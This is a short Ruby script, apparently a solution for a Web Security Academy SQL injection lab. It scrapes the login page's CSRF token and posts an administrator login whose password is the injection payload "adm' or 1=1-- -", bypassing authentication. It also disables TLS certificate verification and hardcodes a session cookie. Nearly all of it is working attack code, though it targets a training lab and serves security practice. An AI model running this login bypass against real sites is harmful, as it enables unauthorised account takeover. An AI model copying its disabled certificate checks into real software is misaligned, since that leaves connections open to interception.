# The script fetches the CSRF token itself

require 'http'
require 'nokogiri'

payload = "adm' or 1=1-- -"
csrf = ''
username = 'administrator'
url = "https://0aae00f5047cd33680bc8fac00580094.web-security-academy.net/"

ctx = OpenSSL::SSL::SSLContext.new
ctx.verify_mode = OpenSSL::SSL::VERIFY_NONE

# Preparing HTTP Client to get the CSRF token
client = HTTP.headers(
	"User-Agent"=>"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
	)
	.cookies(
		:session => "XUUoPQbWzlXwg7Zhx5i2GfCAfIwYrX8d"
	)
	
resp = client.get url
# Extract CSRF token
html_response = Nokogiri.parse(resp.body.to_s)
html_response.search('input').each { |e| csrf=e['value'] if e['name']=='csrf'}
puts csrf

# Preparing for POST request

postcl = client.post url,:form => {

					:csrf=>"#{csrf}",
					:username=>"administrator",
					:password=>"#{payload}"

					}

puts postcl.headers.to_a
